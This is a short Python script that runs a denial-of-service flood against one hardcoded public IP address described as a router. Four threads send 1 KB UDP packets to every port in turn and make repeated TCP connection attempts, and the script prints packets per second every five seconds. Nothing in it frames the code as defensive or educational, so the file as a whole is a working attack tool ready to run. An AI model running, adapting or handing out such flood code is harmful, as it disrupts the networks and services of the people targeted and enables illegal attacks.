import socket
import threading
import time

router_ip = "62.109.121.42"
packet_count = [0]

def optimized_flood(port_range):
    while True:
        try:
            # UDP part
            udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            for port in port_range:
                udp_sock.sendto(b"X" * 1024, (router_ip, port))
                packet_count[0] += 1
            
            # SYN part (single connection attempt)
            syn_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            syn_sock.settimeout(0.01)
            syn_sock.connect_ex((router_ip, port_range[0]))
            syn_sock.close()
            packet_count[0] += 1
            
            udp_sock.close()
        except:
            pass

# Divide workload into 4 threads (reduces device lag)
port_ranges = [
    range(1, 16384),
    range(16384, 32768),
    range(32768, 49152),
    range(49152, 65535)
]

for port_range in port_ranges:
    threading.Thread(target=optimized_flood, args=(port_range,), daemon=True).start()

# Lightweight logging every 5s
last_count = 0
while True:
    time.sleep(5)
    current = packet_count[0]
    print(f"PPS: {(current - last_count)//5}")
    last_count = current
